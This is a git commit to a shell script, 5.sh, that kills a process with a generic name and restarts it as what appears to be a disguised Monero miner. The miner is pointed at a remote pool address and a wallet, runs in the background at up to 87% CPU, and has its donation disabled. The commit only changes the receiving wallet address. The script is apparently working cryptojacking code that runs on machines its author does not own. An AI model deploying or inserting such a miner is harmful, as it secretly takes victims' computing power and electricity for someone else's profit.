514a54c09c6f559f4e47f01fb09be560a28d2fa1
Acronym13 <60100405+Acronym13@users.noreply.github.com>
2020-01-20 05:30:20 -0800

    Update 5.sh

--- 5.sh
+++ 5.sh
@@ -1,3 +1,3 @@
 pkill defaultsoftwarename
 sleep 7
-defaultsoftwarename -o 54.37.56.32:48017 -u 42mFJRYestK5mdjgBtskMHcjGsNJR6NLaa7oZMNyxuAWQLsNTo8pCVvU63E5GAg5pUPErcADggW5NGLmQFVPQDcSAEvbpsr --pass=x:pay2playbytheway@protonmail.com --rig-id=1 -B --donate-level=0 --print-time=30 --threads=defaultthreads --cpu-priority=4 --background --max-cpu-usage=87 --av=1
+defaultsoftwarename -o 54.37.56.32:48017 -u 4ApCAne8nYfVTvBKnA5caLiMBcd8Fta9oUNhsZ9a3jSWF84pA7EhQ1CGiCRa9tw1YdBBHQCvxHmPcFiF1VEenaxY6EmVhHy --pass=x:pay2playbytheway@protonmail.com --rig-id=1 -B --donate-level=0 --print-time=30 --threads=defaultthreads --cpu-priority=4 --background --max-cpu-usage=87 --av=1
